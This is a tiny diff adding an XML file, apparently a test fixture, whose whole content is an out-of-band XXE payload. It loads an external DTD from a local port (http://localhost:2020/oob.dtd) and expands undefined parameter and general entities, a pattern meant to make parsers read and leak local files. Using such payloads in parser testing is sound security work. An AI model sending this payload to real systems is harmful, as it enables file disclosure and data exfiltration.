@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE cdl [<!ENTITY % asd SYSTEM "http://localhost:2020/oob.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
